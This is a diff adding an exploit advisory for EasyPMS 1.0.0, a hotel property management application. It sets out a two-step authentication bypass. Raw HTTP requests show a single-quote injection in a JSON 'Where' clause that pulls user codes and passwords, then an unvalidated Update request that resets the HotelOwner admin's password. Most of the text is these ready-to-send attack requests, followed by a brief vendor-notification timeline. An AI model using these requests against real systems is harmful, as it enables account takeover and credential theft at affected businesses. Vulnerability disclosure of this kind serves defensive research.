@@ -1,0 +1,71 @@
+# Exploit Title: EasyPMS 1.0.0 - Authentication Bypass
+# Discovery by: Jok3r
+# Vendor Homepage: https://www.elektraweb.com/en/
+# Software Link: https://github.com/Travelaps/EasyPMS/releases/
+# Tested Version: 1.0.0
+# Vulnerability Type: Authentication Bypass
+# Tested on OS: Windows Server 2012
+
+#Description:
+
+EasyPMS has authentication bypass vulnerability that low privilege user can escalate privilege to HotelOwner admin privilege.
+
+Steps to Reproduce:
+
+1)
+Unprivileged user can manipulate sql query within json request format. Admin user code can be obtained using single quote after ID column so 
+that where clause is invalid.
+
+First Request:
+
+POST /Select/STDUSER HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://target/app/record/user-profile;index=$ANG.STDUSERID
+Content-Type: text/plain
+Content-Length: 689
+Origin: https://target
+Connection: close
+
+
+
+{"Action":"Select","Object":"STDUSER","Select":["ID","USERCODE","PASSWORD","EMAIL","LASTNAME","GSM","PHONE","HOTELID","FIRSTNAME","PINCODE"],"Where":[{"Column":"ID'","Operator":"=","Value":"80403"},{"Column":"HOTELID","Operator":"=","Value":22330}],"Paging":{"Current":1,"ItemsPerPage":3},"LoginToken":"token_value"}
+
+
+
+2)
+While user is sending password resetting request, can change password of Admin user that is inside HotelOwner privilege class.
+Because there is not validation of token and user has write permission on STDUSER table so admin user password can be changed by unprivileged user that obtains ID of admin user
+sending first request.
+
+
+
+Second Request:
+
+POST / HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://target/login
+Content-Type: text/plain
+Content-Length: 128
+Origin: https://target
+Connection: close
+
+
+{"Row":{"PASSWORD":"Qw12344.","ID":"80401","HOTELID":22330},"SelectAfterUpdate":["ID"],"Action":"Update","Object":"STDUSER"}
+
+
+
+
+
+
+# Timeline:
+# 01.10.2020 - issue was discovered 
+# 02.10.2020 - notify to vendor
+# 02.10.2020 - vendor fixed
